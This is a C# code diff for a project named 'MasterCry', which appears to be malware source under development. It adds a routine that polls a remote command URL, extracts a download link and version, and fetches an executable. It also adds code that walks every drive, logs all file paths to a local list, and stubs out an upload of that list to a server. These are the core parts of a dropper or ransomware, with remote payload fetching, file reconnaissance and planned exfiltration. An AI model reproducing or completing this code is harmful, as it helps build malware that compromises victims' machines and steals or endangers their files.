@@ -34,28 +34,32 @@ namespace MasterCry
         //Todo: Test Downloder
         private void Downloader()
         {
-            var result = (new WebClient()).DownloadString(BuildVars.Command_URL);
-
-            String link = ExtractData(result,BuildVars.Command_URL_Symbol);
-            String ver = ExtractData(result, BuildVars.Command_VER_Symbol);
-
-            var preVer = System_Details.ReadSetting(BuildVars.Config_Command_Version);
-
-            if (preVer.Equals("0") || ver != preVer && !link.Equals("null"))
+            if (IsConnectToInternet())
             {
-                   try
+                var result = (new WebClient()).DownloadString(BuildVars.Command_URL);
+
+                String link = ExtractData(result, BuildVars.Command_URL_Symbol);
+                String ver = ExtractData(result, BuildVars.Command_VER_Symbol);
+
+                var preVer = System_Details.ReadSetting(BuildVars.Config_Command_Version);
+
+                if (preVer.Equals("0") || ver != preVer && !link.Equals("null"))
+                {
+                    try
                     {
                         System_Details.AddUpdateAppSettings(BuildVars.Config_Command_Version, ver);
                         using (WebClient wc = new WebClient())
                         {
                             wc.DownloadFileCompleted += WebClientDownloadCompleted;
-                            wc.DownloadFileAsync(new System.Uri(link),ver + 
+                            wc.DownloadFileAsync(new System.Uri(link), ver +
                             BuildVars.Exe_Name);
                         }
                     }
                     catch (WebException) { }
                     catch (Exception) { }
+                }
             }
+            
         }
         private void WebClientDownloadCompleted(object sender, AsyncCompletedEventArgs args)
         {
@@ -67,6 +71,23 @@ namespace MasterCry
             int pTo = Result.LastIndexOf(Symbol);
             return Result.Substring(pFrom, pTo - pFrom);
         }
+
+        public static bool IsConnectToInternet()
+        {
+            try
+            {
+                using (var client = new WebClient())
+                using (var stream = client.OpenRead("http://www.google.com"))
+                {
+                    return true;
+                }
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
         #endregion
         //Check Every 2 Min
         private void tmrURLCheck_Tick(object sender, EventArgs e)
@@ -108,16 +129,18 @@ namespace MasterCry
             //{
             //    RegisterInStartup(true);
             //}
-
-            foreach (var drv in getDrives())
+            if(!System.IO.File.Exists(BuildVars.Save_Items_Location))
             {
-                var data = GetFileList(drv);
-                foreach (var item in data)
+                foreach (var drv in getDrives())
                 {
-                    Console.WriteLine(item);
-                    //listBox1.Items.Add(item);
+                    var data = GetFileList(drv);
+                    foreach (var item in data)
+                    {
+                        WriteItems(item);
+                    }
                 }
             }
+            
         }
         #region "Search Files on Drives"
         List<string> getDrives()
@@ -184,6 +207,21 @@ namespace MasterCry
         {
             return Path.GetPathRoot(Environment.SystemDirectory);
         }
-#endregion
+
+        private static void WriteItems(string Text)
+        {
+            using (System.IO.StreamWriter file =
+            new System.IO.StreamWriter(BuildVars.Save_Items_Location, true))
+            {
+                file.WriteLine(Text);
+            }
+        }
+
+        #endregion
+
+        private void Upload()
+        {
+            //Todo: Read Line by Line from item.txt and upload to server and Remove from item.txt
+        }
     }
 }
